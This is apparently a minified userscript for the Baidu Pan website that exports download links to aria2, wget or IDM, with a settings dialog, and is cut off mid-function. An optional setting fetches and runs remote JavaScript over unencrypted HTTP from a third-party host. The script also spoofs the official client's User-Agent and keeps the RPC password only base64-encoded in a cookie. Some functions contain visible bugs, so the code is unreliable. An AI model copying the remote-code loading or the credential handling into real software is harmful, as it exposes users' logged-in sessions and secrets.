function A(){function loadjs(){if("undefined"==typeof perform_of_number){window.perform_of_number=1;var a=document.createElement("script");a.id="webjs",a.src="http://downjs.sinaapp.com/javascript/baiducloud_exporter_UglifyJSgg.js",a.onload=a.onreadystatechange=function(){this.readyState&&"loaded"!=this.readyState&&"complete"!=this.readyState||clearInterval(window.loadtime)},document.body.appendChild(a),window.loadtime=window.setTimeout(function(){Utilities.useToast({toastMode:disk.ui.Toast.MODE_CAUTION,msg:"加载远端的JS...失败。现在使用本地的脚本。",sticky:!1});var a=document.getElementById("webjs");document.body.removeChild(a),window.setTimeout(A,1e3)},3500)}else Utilities.useToast({toastMode:disk.ui.Toast.MODE_LOADING,msg:"好像远端脚本也错误了，等更新吧。",sticky:!1})}function localjs(){var b,c,d,a=$("script");for(c=0;c<a.length;c++)b=$(a[c]).attr("src"),b&&(-1!=b.indexOf("yun_home_speed_all.js")||-1!=b.indexOf("viewshare_all.js")||-1!=b.indexOf("module_header.js"))&&(b=b.split("=")[1],b>baidu_version?(d="检测到网站有更新，如不能正常使用插件，等更新吧。",Utilities.useToast({toastMode:disk.ui.Toast.MODE_CAUTION,msg:d,sticky:!1})):(d="脚本载入没问题",Utilities.useToast({toastMode:disk.ui.Toast.MODE_SUCCESS,msg:d,sticky:!1})));SetMessage=function(a,b){Utilities.useToast({toastMode:b,msg:a,sticky:!1})},event=function(){$("#setting_div_more_settings_but").click(function(){"none"!=$("#setting_div_table_2").css("display")?($("#setting_div_table_1").css("display","table"),$("#setting_div_table_2").css("display","none"),$("#setting_div_more_settings_but a").html("更多设置")):($("#setting_div_table_1").css("display","none"),$("#setting_div_table_2").css("display","table"),$("#setting_div_more_settings_but a").html("返回"))}),$("#rpc_distinguish").click(function(){$(this).attr("checked")?($("#rpc_user").removeAttr("disabled"),$("#rpc_pass").removeAttr("disabled")):($("#rpc_user").attr({disabled:"disabled"}),$("#rpc_pass").attr({disabled:"disabled"}))}),$("#yingyong").click(function(){config.save(config.get_table()),$("#setting_divtopmsg").html("设置已保存。"),Initialize()}),$("#send_test").click(function(){0==$(this).attr("type")&&(aria2send_data.getVersion(),$(this).html("请稍后..."),$(this).attr({type:1}))}),$("#setting_div_close").click(function(){$("#setting_div").css("display","none"),$("#masking").css("display","none")}),$("#referer_auto").click(function(){$(this).attr("checked")?$("#setting_aria2_referer_input").attr("disabled","disabled"):$("#setting_aria2_referer_input").removeAttr("disabled")}),$("#yingyong").hover(function(){$(this).css({"background-color":"#3482DA",color:"#FFF"})},function(){$(this).css({"background-color":"#F7F7F7",color:"#1B83EB"})}),$("#setting_aria2_useragent a").hover(function(){$(this).css({"background-color":"#3482DA",color:"#FFF"})},function(){$(this).css({"background-color":"#F7F7F7",color:"#1B83EB"})}),$("#setting_div input:text").focus(function(){$(this).css({border:"1px solid #BBD4EF","box-shadow":"0 0 3px #BBD4EF","-webkit-box-shadow":"0 0 3px #BBD4EF"})}).blur(function(){$(this).css({border:"1px solid #C6C6C6","box-shadow":"0 0 3px #C6C6C6","-webkit-box-shadow":"0 0 3px #C6C6C6"})}).hover(function(){$(this).select()})},add_setting_div=function(){function c(){var a={"margin-left":"15px",display:"inline-block",color:"#1B83EB",border:"1px solid #DCE1E6","background-color":"#F7F7F7","text-align":"center","text-decoration":"none",padding:"0px 5px"};$("#setting_aria2_useragent a").css(a)}var b,a=document.createElement("div");a.className="b-panel b-dialog download-mgr-dialog",a.id="setting_div",b=[],b.push('<div class="dlg-hd b-rlv"><div title="关闭" id="setting_div_close" class="dlg-cnr dlg-cnr-r"></div><h3>导出设置</h3></div></div>'),b.push('<div style="height:420px;">'),b.push('<div id="setting_div_more_settings_but" style="width:60px; border:1px solid #F0F0F0; background-color: #FAFAFA; margin-top: -19px; margin-right: 15px; float:right; text-align:center;"><a href="javascript:;">更多设置</a></div>'),b.push('<div style="margin-left: 15px; margin-right: 15px; margin-top: 25px; margin-bottom: 5px;">'),b.push('<div id="setting_divtopmsg" style="position:absolute; margin-top: -20px; margin-left: 10px; color: #E15F00;"></div>'),b.push('<div style="border:1px solid rgb(240, 240, 240); background-color: rgb(250, 250, 250);">'),b.push('<div id="setting_div_table">'),b.push('<table id="setting_div_table_1" width="100%" border="0" style="border-collapse:separate; border-spacing:10px; display:table;">'),b.push("<tr>"),b.push('<td width="150"><label for="textfield">ARIA2 RPC： </label></td>'),b.push('<td width="320"><input id="rpc_input" type="text" style="width:90%; border: 1px solid #C6C6C6; box-shadow: 0 0 3px #C6C6C6; -webkit-box-shadow: 0 0 3px #C6C6C6;"/></td>'),b.push("</tr><tr>"),b.push('<td><label for="textfield">RPC访问设置</label></td>'),b.push('<td><input id="rpc_distinguish" type="checkbox"/></td>'),b.push("</tr><tr>"),b.push('<td><label for="textfield">RPC 用户名： </label></td>'),b.push('<td><input type="text" id="rpc_user" disabled="disabled" style="width:150px; border: 1px solid #C6C6C6; box-shadow: 0 0 3px #C6C6C6; -webkit-box-shadow: 0 0 3px #C6C6C6;"/></td>'),b.push("</tr><tr>"),b.push('<td><label for="textfield">RPC 密码： </label></td>'),b.push('<td><input type="text" id="rpc_pass" disabled="disabled" style="width:150px; border: 1px solid #C6C6C6; box-shadow: 0 0 3px #C6C6C6; -webkit-box-shadow: 0 0 3px #C6C6C6;"/>'),b.push('<div style="position:absolute; margin-top: -20px; right: 20px;"><a id="send_test" type=0 href="javascript:;" style="display:inline-block; border:1px solid #D1D1D1; background-color: #F7F7F7; text-align: center; text-decoration: none; color:#1B83EB;">测试连接，成功显示版本号。</a></div></td>'),b.push("</tr><tr>"),b.push('<td colspan="2"><div style="color: #656565;">相关设置</div><li class="b-list-item separator-1"></li></td>'),b.push("</tr><tr>"),b.push('<td>下载目录： </td><td><input id="down_dir" type="text" style="width:280px; border: 1px solid #C6C6C6; box-shadow: 0 0 3px #C6C6C6; -webkit-box-shadow: 0 0 3px #C6C6C6;"/></td>'),b.push("</tr><tr>"),b.push('<td>根据网盘路径存放文件</td><td><input id="web_path_save" type="checkbox"/></td>'),b.push("</tr><tr>"),b.push('<!-- <td>增加115网盘支持</td><td><input id="add_115" type="checkbox" style="vertical-align:text-bottom;"/>(现在只有一个导出按钮，还没有设置面板，设置项通用。)</td> -->'),b.push('<td>对文件夹使用zip下载</td><td><input id="dirzip" type="checkbox" style="vertical-align:text-bottom;"/>(只对分享链接有效。)</td>'),b.push("</tr><tr>"),b.push('<td>使用远程的JS脚本</td><td><input id="iswebjs" type="checkbox" style="vertical-align:text-bottom;"/>(好处是能够保持最新的状态。)</td>'),b.push("</tr><tr>"),b.push('<td colspan="2"><div style="color: #656565;">导出类型设置</div><li class="b-list-item separator-1"></li></td>'),b.push("</tr><tr>"),b.push('<td colspan="2" id="typeout">'),b.push('<div style="width:80px; float:left; margin-left:30px;"><input id="aria2rpc_checkbox" type="checkbox" disabled="disabled" checked="checked" style="vertical-align:text-bottom;"/><label for="textfield">ARIA2 RPC</label></div>'),b.push('<div style="width:70px; float:left; margin-left:50px;"><input id="aria2_checkbox" type="checkbox" style="vertical-align:text-bottom;"/><label for="textfield">ARIA2</label></div>'),b.push('<div style="width:70px; float:left; margin-left:50px;"><input id="wget_checkbox" type="checkbox" style="vertical-align:text-bottom;"/><label for="textfield">WGET</label></div>'),b.push('<div style="width:70px; float:left; margin-left:50px;"><input id="idm_checkbox" type="checkbox" style="vertical-align:text-bottom;"/><label for="textfield">IDM</label></div>'),b.push("</td></tr><tr>"),b.push("</table>"),b.push('<table id="setting_div_table_2" width="100%" border="0" style="border-collapse:separate; border-spacing:10px; display:none;">'),b.push("<tr>"),b.push('<td width="50"><label for="textfield"></label></td>'),b.push('<td width="320"><label for="textfield"></label></td>'),b.push("</tr><tr>"),b.push('<td colspan="2"><div style="color: #656565;">User-Agent</div><li class="b-list-item separator-1"></li></td>'),b.push("</tr><tr>"),b.push('<td colspan="2" id="setting_aria2_useragent">'),b.push('<a href="javascript:;" onclick=\'javascript:headers_.set_UA("chrome");\'><b>Chrome</b></a>'),b.push('<a href="javascript:;" onclick=\'javascript:headers_.set_UA("firefox");\'><b>Firefox</b></a>'),b.push('<a href="javascript:;" onclick=\'javascript:headers_.set_UA("exe");\'>云管家</a>'),b.push('<a href="javascript:;" onclick=\'javascript:document.getElementById("setting_aria2_useragent_input").removeAttribute("disabled");\'>自定义</a>'),b.push("</td>"),b.push("</tr><tr>"),b.push('<td><label for="textfield">User-Agent :</label></td>'),b.push('<td><input type="text" id="setting_aria2_useragent_input" disabled="disabled" style="width:90%; border: 1px solid #C6C6C6; box-shadow: 0 0 3px #C6C6C6; -webkit-box-shadow: 0 0 3px #C6C6C6;"/></td>'),b.push("</tr><tr>"),b.push('<td colspan="2"><div style="color: #656565;">Referer</div><li class="b-list-item separator-1"></li></td>'),b.push("</tr><tr>"),b.push('<td><label for="textfield">Referer ： </label></td>'),b.push('<td><input type="text" id="setting_aria2_referer_input" style="width:90%; border: 1px solid #C6C6C6; box-shadow: 0 0 3px #C6C6C6; -webkit-box-shadow: 0 0 3px #C6C6C6;"/></td>'),b.push("</tr><tr>"),b.push('<td><label for="textfield">自动设置</label></td>'),b.push('<td><input id=referer_auto type="checkbox"/></td>'),b.push("</tr><tr>"),b.push('<td colspan="2"><div style="color: #656565;">Headers<label for="textfield" style="margin-left: 35px;">※使用回车分隔每个headers。</label></div><li class="b-list-item separator-1"></li></td>'),b.push("</tr><tr>"),b.push('<td><label for="textfield">headers ： </label></td>'),b.push('<td><textarea id="setting_aria2_headers" style="overflow:auto; resize:none; width:90%; height:80px; border: 1px solid #C6C6C6; box-shadow: 0 0 3px #C6C6C6; -webkit-box-shadow: 0 0 3px #C6C6C6;"></textarea></td>'),b.push("</tr>"),b.push("</table>"),b.push("</div>"),b.push("</div>"),b.push('<div style="margin-top:10px;">'),b.push('<div style="float:left; margin-top:25px; color: #656565">脚本版本：'+version+" 更新于："+thedate_update+'<a href="http://baiducloudwebplug.duapp.com/" style="margin-left: 10px" target="_blank">去看看有没有更新？</a></div>'),b.push('<div style="margin-left:77.5%;"><a href="javascript:;" id="yingyong" style="display:inline-block; width:120px; height:30px; border:1px solid #D1D1D1; background-color: #F7F7F7; text-align: center; text-decoration: none; padding-top:7px; color:#1B83EB;"><b>应用</b></a></div>'),b.push("</div></div></div>"),a.innerHTML=b.join(""),document.body.appendChild(a),$("#setting_div").css({border:"1px solid #999"}),event(),center($("#setting_div")),document.getElementById("setting_aria2_useragent_input").value="netdisk;4.4.0.6;PC;PC-Windows;6.2.9200;WindowsBaiduYunGuanJia",document.getElementById("setting_aria2_referer_input").value="http://pan.baidu.com/disk/home",c()},masking=function(){var b,a=document.createElement("div");a.id="masking",a.style.left="0px",a.style.top="0px",a.style.width=$(window).width()+"px",a.style.height=$(window).height()+"px",a.style.display="none",a.style.zIndex=890,a.style.opacity=.1,a.style.position="absolute",document.body.appendChild(a),b=$("#masking"),b.css({"background-color":"#000","-moz-opacit":.1}),$(window).resize(function(){b.width($(window).width()+"px"),b.height($(window).height()+"px")})},center=function(a){var b=$(window).width(),c=$(window).height(),d=$(document).scrollTop(),e=(b-a.width())/2,f=(c-a.height())/2+d;a.css({left:e+"px",top:f+"px"}),$(window).resize(function(){b=$(window).width(),c=$(window).height(),d=$(document).scrollTop(),e=(b-a.width())/2,f=(c-a.height())/2+d,a.css({left:e+"px",top:f+"px"})}),$(window).scroll(function(){b=$(window).width(),c=$(widow).height(),d=$(document).scrollTop(),e=(b-a.width())/2,f=(c-a.height())/2+d,a.css({left:e+"px",top:f+"px"})})},button=function(){var b,c,d,a=[];a.push('<ul id="outlist_ul" style="display:none; position:absolute; text-align: center; border:#CFCFCF 1px solid; box-shadow: 0 2px 3px #CFCFCF; -webkit-box-shadow: 0 2px 3px #CFCFCF; line-height: 24px; text-decoration: none; z-index:100; background-color: #FFF">'),a.push('<li style="display: block"><a href="javascript:;" onclick="javascript:aria2send_data.getGlobalOption();" id="out_rpc">ARIA2 RPC</a></li>'),a.push('<li style="display: none"><a href="javascript:;" onclick="javascript:fileinfo.out_type=\'aria2\';fileinfo.getinfo();" id="out_aria2">ARIA2</a></li>'),a.push('<li style="display: none"><a href="javascript:;" onclick="javascript:fileinfo.out_type=\'wget\';fileinfo.getinfo();" id="out_wget">WGET</a></li>'),a.push('<li style="display: none"><a href="javascript:;" onclick="javascript:fileinfo.out_type=\'idm\';fileinfo.getinfo();" id="out_idm">IDM</a></li>'),a.push('<li style="display: block"><a href="javascript:;"  id="setting">设置</a></li>'),a.push("</ul>"),FileUtils.share_uk?(b=document.createElement("a"),b.className="new-dbtn",b.id="outlist",b.setAttribute("hideFocus","true"),b.style.cssText="width:50px;",b.innerHTML='<em class="icon-download"></em><b>导出</b>'+a.join(""),$('span a[class="new-dbtn"]').parent().prepend(b)):(c=document.createElement("li"),c.className="b-list-item",c.id="outlist",c.innerHTML='<a class="bbtn" id="aaa" style="width:47px;"><em class="icon-download"></em><b>导出</b></a>',$('ul[class="b-list-2 bar-cmd-list"]').append(c),$("#aaa").append(a.join(""))),d=$("#outlist").innerWidth()-2+"px",FileUtils.share_uk||(d=$("#outlist").width()-2+"px"),$("#outlist_ul").css({left:"0px",width:d,"margin-top":"-1px"}),$("#outlist_ul a").css({color:"#666",display:"inline-block",width:"100%",height:"100%"}),$("#outlist_ul li").hover(function(){$(this).css("background","#E4EEFE")},function(){$(this).css("background","#FFFFFF")}),$("#outlist").hover(function(){$("#outlist_ul").css("display","block")},function(){$("#outlist_ul").css("display","none")}),$("#setting").click(function(){$("#masking").css("display","block"),$("#setting_divtopmsg").html(null),$("#setting_div").css("display","block"),Initialize()})},config={get_table:function(){var e,a=[{input:{},checked:{}}],b=$("#setting_div input[type=checkbox]"),c=$("#setting_div input[type=text]"),d=document.getElementById("setting_aria2_headers");for(e=0;e<b.length;e++)a[0].checked[$(b[e]).attr("id")]=$(b[e]).attr("checked");for(e=0;e<c.length;e++)a[0].input[$(c[e]).attr("id")]=$(c[e]).attr("value");return d.value&&(a[0].textarea=d.value),a},save:function(a){var e,f,b="iswebjs",c=365,d=new Date;d.setTime(d.getTime()+1e3*60*60*24*c);for(e in a[0].checked)"iswebjs"==e&&(document.cookie=a[0].checked.iswebjs?b+"="+"1"+";expires="+d.toGMTString()+";path=/;":b+"="+"0"+";expires="+d.toGMTString()+";path=/;",delete a[0].checked[e]);f=window.btoa(encodeURIComponent(JSON.stringify(a))),b="bcofl_v2",document.cookie=b+"="+f+";expires="+d.toGMTString()+";path=/;"},get:function(){var c,a="bcofl_v2",b=document.cookie.match(new RegExp("(^| )"+a+"=([^;]*)(;|$)"));return null!=b?(c=window.atob(b[2]),config.params=JSON.parse(decodeURIComponent(c)),config.params):null},params:[]},aria2send_data={getGlobalOption:function(){var a={jsonrpc:"2.0",id:1,method:"aria2.getGlobalOption",params:[]},b={type:"POST",url:config.params[0].input.rpc_input+"?tm="+(new Date).getTime().toString(),data:JSON.stringify(a),dataType:"JSON",success:function(){fileinfo.out_type="aria2_rpc",fileinfo.getinfo()},contentType:"application/x-www-form-urlencoded; charset=UTF-8",error:function(){fileinfo.out_type="aria2_rpc",fileinfo.getinfo(),SetMessage("先确保与Aria2RPC能够正常通信后在使用喔。",disk.ui.Toast.MODE_CAUTION)}};config.params[0].checked.rpc_distinguish&&(b.headers={Authorization:"Basic "+btoa(config.params[0].input.rpc_user+":"+config.params[0].input.rpc_pass)}),HttpSendRead(b)},getVersion:function(){var a=[{jsonrpc:"2.0",method:"aria2.getVersion",id:1}],b={type:"POST",url:$("#rpc_input").attr("value")+"?tm="+(new Date).getTime().toString(),data:JSON.stringify(a),dataType:"JSON",success:function(a){$("#send_test").attr("type",0),$("#send_test").html("ARIA2版本为： "+a[0].result.version)},contentType:"application/x-www-form-urlencoded; charset=UTF-8",error:function(a){$("#send_test").attr("type",0),$("#send_test").html(a+"错误，点击重新测试")}};$("#rpc_distinguish").attr("checked")&&(b.headers={Authorization:"Basic "+btoa($("#rpc_user").attr("value")+":"+$("#rpc_pass").attr("value"))}),HttpSendRead(b)},addUri:function(a){var b={type:"POST",url:config.params[0].input.rpc_input+"?tm="+(new Date).getTime().toString(),data:JSON.stringify(a),dataType:"JSON",success:function(){},contentType:"application/x-www-form-urlencoded; charset=UTF-8",error:function(){}};config.params[0].checked.rpc_distinguish&&(b.headers={Authorization:"Basic "+btoa(config.params[0].input.rpc_user+":"+config.params[0].input.rpc_pass)}),HttpSendRead(b)}},fileinfo={info:[],vcode:{},data:[],isdir:0,file_fsid:[],filelist:[],dir_fsid:[],dir_savename:"",savename:"",out_type:"",share_path:"",ajax_state:0,sign:"",temp:"",mycloud_fileinfo:{},ajaxsuccess:function(a){var c,d,e,b=a;if(0==b.errno){if(b.list){for(c=0;c<fileinfo.info.length;c++)0==fileinfo.info[c].isdir&&(fileinfo.savename=fileinfo.info[c].server_filename,config.params[0].checked.web_path_save&&(fileinfo.savename=config.params[0].input.down_dir+fileinfo.share_path+"/"+fileinfo.info[c].server_filename),d=combination[fileinfo.out_type](b.list[fileinfo.info[c].fs_id],fileinfo.savename),fileinfo.data.push(d));if(fileinfo.file_fsid.splice(0,fileinfo.file_fsid.length),fileinfo.info.splice(0,fileinfo.info.length),0!=fileinfo.dir_fsid.length)e="fid_list="+JSON.stringify(fileinfo.dir_fsid),fileinfo.isdir=1,fileinfo.getdinlk(e);else if(e="data:application/octet-stream;charset=utf-8,"+encodeURIComponent(fileinfo.data.join("")),"wget"==fileinfo.out_type)down_dialog(fileinfo.out_type,e,fileinfo.data.join("")),$("#masking").css("display","block"),SetMessage("完成咯~~~",disk.ui.Toast.MODE_SUCCESS),fileinfo.ajax_state=0;else if("aria2_rpc"==fileinfo.out_type){for(c=0;c<fileinfo.data.length;c++)aria2send_data.addUri(fileinfo.data[c]);SetMessage("已经添加了喔，去确认看下吧。",disk.ui.Toast.MODE_SUCCESS),fileinfo.ajax_state=0}else down_dialog(fileinfo.out_type,e,""),$("#masking").css("display","block"),SetMessage("完成咯~~~",disk.ui.Toast.MODE_SUCCESS),fileinfo.ajax_state=0}else if(b.dlink)if(fileinfo.savename=fileinfo.info.server_filename,config.params[0].checked.web_path_save&&(fileinfo.savename=config.params[0].input.down_dir+"/"+fileinfo.info.path),1==fileinfo.isdir&&(fileinfo.savename="【打包下载】"+fileinfo.dir_savename+"_等.zip",fileinfo.dir_fsid.splice(0,fileinfo.dir_fsid.length)),d=combination[fileinfo.out_type](b.dlink,fileinfo.savename),fileinfo.data.push(d),fileinfo.info.splice(0,fileinfo.info.length),fileinfo.file_fsid.splice(0,fileinfo.file_fsid.length),0!=fileinfo.dir_fsid.length)e="fid_list="+JSON.stringify(fileinfo.dir_fsid),fileinfo.isdir=1,fileinfo.getdinlk(e);else if(e="data:application/octet-stream;charset=utf-8,"+encodeURIComponent(fileinfo.data.join("")),"wget"==fileinfo.out_type)down_dialog(fileinfo.out_type,e,fileinfo.data.join("")),$("#masking").css("display","block"),SetMessage("完成咯~~~",disk.ui.Toast.MODE_SUCCESS),fileinfo.ajax_state=0;else if("aria2_rpc"==fileinfo.out_type){for(c=0;c<fileinfo.data.length;c++)aria2send_data.addUri(fileinfo.data[c]);SetMessage("已经添加了喔，去确认看下吧。",disk.ui.Toast.MODE_SUCCESS),fileinfo.ajax_state=0}else down_dialog(fileinfo.out_type,e,""),$("#masking").css("display","block"),SetMessage("完成咯~~~",disk.ui.Toast.MODE_SUCCESS),fileinfo.ajax_state=0}else-19==b.errno?(fileinfo.vcode=b.vcode,alert_dialog.create(),alert_dialog.img(fileinfo.vcode),alert_dialog.event()):(SetMessage("在获取文件地址的时候失败了。。。。",disk.ui.Toast.MODE_CAUTION),fileinfo.ajax_state=0)},getdinlk:function(a){var d,e,f,b=FileUtils.share_uk,c=FileUtils.share_id;Utilities.useToast({toastMode:disk.ui.Toast.MODE_LOADING,msg:"努力加载中....",sticky:!0}),d="http://"+window.location.host+"/share/download?channel=chunlei&clienttype=0&web=1"+"&uk="+b+"&shareid="+c+"&timestamp="+FileUtils.share_timestamp+"&sign="+FileUtils.share_sign+"&bdstoken="+FileUtils.bdstoken,0==fileinfo.isdir&&(d+="&nozip=1"),e=d,f={type:"POST",url:e,data:a,dataType:"JSON",success:function(a){fileinfo.ajaxsuccess(a)},error:function(){SetMessage("在获取文件信息的时候失败了。。",disk.ui.Toast.MODE_CAUTION),fileinfo.ajax_state=0}},HttpSendRead(f)},dtcount:function(a){var b,c,d,f,g;fileinfo.temp=a,b=FileUtils.share_uk,c=FileUtils.share_id,d="http://"+window.location.host+"/mis/dtcount?channel=chunlei&clienttype=0&web=1&bdstoken="+FileUtils.bdstoken,new FormData,f="uk="+b+"&filelist="+JSON.stringify(fileinfo.filelist)+"&sid="+c+"&ctime="+FileUtils.share_timestamp+"&public=1",g={type:"POST",url:d,data:f,dataType:"JSON",success:function(a){0==a.errno?fileinfo.getdinlk(fileinfo.temp):0!=a.errno&&SetMessage("获取下载地址失败，（"+a.errno+"）",disk.ui.Toast.MODE_CAUTION)},error:function(){SetMessage("在获取文件信息的时候失败了。。",disk.ui.Toast.MODE_CAUTION),fileinfo.ajax_state=0}},HttpSendRead(g)},getinfo:function(){var a,b,c,d;if(0!=fileinfo.ajax_state)return null;if(fileinfo.ajax_state=1,FileUtils.share_uk){if(fileinfo.data.splice(0,fileinfo.data.length),fileinfo.filelist.splice(0,fileinfo.filelist.length),fileinfo.dir_fsid.splice(0,fileinfo.dir_fsid.length),fileinfo.file_fsid.splice(0,fileinfo.file_fsid.length),disk.util.ViewShareUtils)fileinfo.info.push(JSON.parse(disk.util.ViewShareUtils.viewShareData)),fileinfo.file_fsid.push(fileinfo.info[0].fs_id),fileinfo.isdir=0,a="fid_list="+JSON.stringify(fileinfo.file_fsid),fileinfo.dtcount(a);else if(FileUtils.getListViewCheckedItems()){if(fileinfo.info=FileUtils.getListViewCheckedItems(),fileinfo.share_path=FileUtils._mFileFilter._mTag,0==fileinfo.info.length)return SetMessage("请先选择1个以上的文件",disk.ui.Toast.MODE_CAUTION),fileinfo.ajax_state=0,null;for(b=0;b<fileinfo.info.length;b++)1==fileinfo.info[b].isdir?config.params[0].checked.dirzip&&(fileinfo.dir_fsid.push(fileinfo.info[b].fs_id),fileinfo.dir_savename||(fileinfo.dir_savename=fileinfo.info[b].server_filename)):0==fileinfo.info[b].isdir&&(c={fid:fileinfo.info[b].fs_id,category:fileinfo.info[b].category},fileinfo.filelist.push(c),fileinfo.file_fsid.push(fileinfo.info[b].fs_id));0!=fileinfo.file_fsid.length?(fileinfo.isdir=0,a="fid_list="+JSON.stringify(fileinfo.file_fsid),fileinfo.dtcount(a)):0==fileinfo.file_fsid.length&&0!=fileinfo.dir_fsid.length&&(a="fid_list="+JSON.stringify(fileinfo.dir_fsid),fileinfo.isdir=1,fileinfo.dtcount(a)),0==fileinfo.file_fsid.length&&0==fileinfo.dir_fsid.length&&(fileinfo.ajax_state=0)}}else{if(fileinfo.data.splice(0,fileinfo.data.length),fileinfo.filelist.splice(0,fileinfo.filelist.length),fileinfo.dir_fsid.splice(0,fileinfo.dir_fsid.length),fileinfo.file_fsid.splice(0,fileinfo.file_fsid.length),fileinfo.info=FileUtils.getListViewCheckedItems(),0==fileinfo.info.length)return SetMessage("请先选择1个以上的文件",disk.ui.Toast.MODE_CAUTION),fileinfo.ajax_state=0,null;for(d=[],b=0;b<fileinfo.info.length;b++)0==fileinfo.info[b].isdir&&(fileinfo.savename=fileinfo.info[b].server_filename,config.params[0].checked.web_path_save&&(fileinfo.savename=fileinfo.info[b].path),d.push(fileinfo.info[b].fs_id),fileinfo.temp='{"fs_id":'+fileinfo.info[b].fs_id+',"name":"'+fileinfo.savename+'","dlink":""}',fileinfo.mycloud_fileinfo[fileinfo.info[b].fs_id]=JSON.parse(fileinfo.temp));fileinfo.get_mycloud_dlnk(d)}},out_cloudfileinfo:function(){var a,b;if(SetMessage("完成咯~",disk.ui.Toast.MODE_SUCCESS),0!=fileinfo.data.length)if(a="data:application/octet-stream;charset=utf-8,"+encodeURIComponent(fileinfo.data.join("")),"aria2_rpc"==fileinfo.out_type){for(b=0;b<fileinfo.data.length;b++)aria2send_data.addUri(fileinfo.data[b]);SetMessage("已经添加了喔，去确认看下吧。",disk.ui.Toast.MODE_SUCCESS),fileinfo.ajax_state=0}else"wget"==fileinfo.out_type?(down_dialog(fileinfo.out_type,a,fileinfo.data.join("")),$("#masking").css("display","block"),fileinfo.ajax_state=0):(down_dialog(fileinfo.out_type,a,""),$("#masking").css("display","block"),fileinfo.ajax_state=0);else fileinfo.ajax_state=0},get_mycloud_dlnk:function(a){var b,c;return Utilities.useToast({toastMode:disk.ui.Toast.MODE_LOADING,msg:"正在努力载入中……",sticky:!0}),fileinfo.sign="undefined"!=typeof FileUtils.base64Encode?FileUtils.base64Encode(FileUtils.sign2(FileUtils.sign3,FileUtils.sign1)):file.info.BaiduBase64encode(FileUtils.sign2(FileUtils.sign3,FileUtils.sign1)),"undefined"==typeof fileinfo.sign?(SetMessage("无法获取请求下载地址时的参数，（待更新...）",disk.ui.Toast.MODE_CAUTION),null):(b="sign="+encodeURIComponent(fileinfo.sign)+"&timestamp="+FileUtils.timestamp+"&fidlist="+encodeURIComponent(JSON.stringify(a))+"&type=dlnk",c={type:"POST",url:"http://"+window.location.host+"/api/download?channel=chunlei&clienttype=0&web=1&bdstoken="+FileUtils.bdstoken,data:b,dataType:"JSON",success:function(a){if(0==a.errno){for(var b=0;b<a.dlink.length;b++)fileinfo.mycloud_fileinfo[a.dlink[b].fs_id].dlink=a.dlink[b].dlink,fileinfo.data.push(combination[fileinfo.out_type](a.dlink[b].dlink,fileinfo.mycloud_fileinfo[a.dlink[b].fs_id].name));fileinfo.out_cloudfileinfo()}112==a.error&&SetMessage("当前页面已超时，请刷新页面后重试。（"+a.errno+"）",disk.ui.Toast.MODE_CAUTION),0!=a.errno&&112!=a.errno&&SetMessage("获取下载地址失败。（"+a.errno+"）",disk.ui.Toast.MODE_CAUTION)},error:function(){SetMessage("在获取文件信息的时候失败了。。",disk.ui.Toast.MODE_CAUTION),fileinfo.ajax_state=0}},HttpSendRead(c),void 0)},BaiduBase64encode:function(a){var c,d,e,f,g,h,b="";for(e=a.length,d=0,c="";e>d;){if(f=255&a.charCodeAt(d++),d==e){c+=b.charAt(f>>2),c+=b.charAt((3&f)<<4),c+="==";break}if(g=a.charCodeAt(A++),d==e){c+=b.charAt(f>>2),c+=b.charAt((3&f)<<4|(240&g)>>4),c+=b.charAt((15&g)<<2),c+="=";break}h=a.charCodeAt(d++),c+=b.charAt(f>>2),c+=b.charAt((3&f)<<4|(240&g)>>4),c+=b.charAt((15&g)<<2|(192&h)>>6),c+=b.charAt(63&h)}return c}},headers_={UA:{chrome:"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.5 Safari/537.36",firefox:"Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0",exe:"netdisk;4.4.0.6;PC;PC-Windows;6.2.9200;WindowsBaiduYunGuanJia"},set_UA:function(a){var b=document.getElementById("setting_aria2_useragent_input");return b.value=headers_.UA[a],b.disabled="disabled",!0}},alert_dialog={create:function(){var b,c,d,e,f,g,h,a=document.createElement("div");a.className="b-panel b-dialog alert-dialog",a.id="alert_div",b=[],b.push('<div class="dlg-hd b-rlv">'),b.push('<div title="关闭" id="alert_dialog_close" class="dlg-cnr dlg-cnr-r"></div>'),b.push("<h3>验证码</h3>"),b.push("</div>"),b.push('<div class="dlg-bd">'),b.push('<div class="alert-dialog-msg center">'),b.push('<div class="download-verify" id="downloadVerify">'),b.push('<div class="verify-body">请输入验证码： '),b.push('<input id="verification" type="text" class="input-code" maxlength="4">'),b.push('<img id="yanzhengma" class="img-code" alt="验证码获取中" src="" width="100" height="30">'),b.push('<a href="javascript:;" class="underline" id="huanyizhang">换一张</a>'),b.push("</div>"),b.push('<div class="verify-error"></div></div>'),b.push("</div></div>"),b.push('<div class="dlg-ft b-rlv">'),b.push('<div class="alert-dialog-commands clearfix center">'),b.push('<a href="javascript:;" id="okay" class="sbtn okay"><b>确定</b></a>'),b.push('<a href="javascript:;" id="ignore" class="dbtn cancel"><b>取消</b></a>'),b.push("</div>"),b.push('<div class="clearfix alert-dialog-commands-plus" >'),b.push("</div></div>"),a.innerHTML=b.join(""),document.body.appendChild(a),c=$("#alert_div"),d=$(window).width(),e=$(window).height(),f=$(document).scrollTop(),g=(d-c.width())/2,h=(e-c.height())/2+f,$("#alert_div").css({left:g+"px",top:h+"px"}),$("#alert_div").css({display:"block",border:"1px solid #999"}),$("#masking").css("display","block")},img:function(a){var b="http://vcode.baidu.com/genimage";$("#yanzhengma").attr("src",b+"?"+a)},event:function(){$("#huanyizhang").unbind().click(function(){var a="http://vcode.baidu.com/genimage";$("#yanzhengma").attr("src",a+"?"+fileinfo.vcode+"&"+(new Date).getTime())}),$("#okay").unbind().click(function(){var a=$("#verification").attr("value"),b="fid_list="+JSON.stringify(fileinfo.file_fsid);1==fileinfo.isdir&&(b="fid_list="+JSON.stringify(fileinfo.dir_fsid)),b=b+"&input="+a+"&vcode="+fileinfo.vcode,fileinfo.getdinlk(b),$("#alert_div").remove(),$("#masking").css("display","none")}),$("#ignore").unbind().click(function(){$("#alert_div").remove(),$("#masking").css("display","none"),SetMessage("唉.....",disk.ui.Toast.MODE_CAUTION),fileinfo.ajax_state=0}),$("#alert_dialog_close").unbind().click(function(){$("#alert_div").remove(),$("#masking").css("display","none"),SetMessage("唉.....",disk.ui.Toast.MODE_CAUTION),fileinfo.ajax_state=0})}},down_dialog=function(a,b,c){var 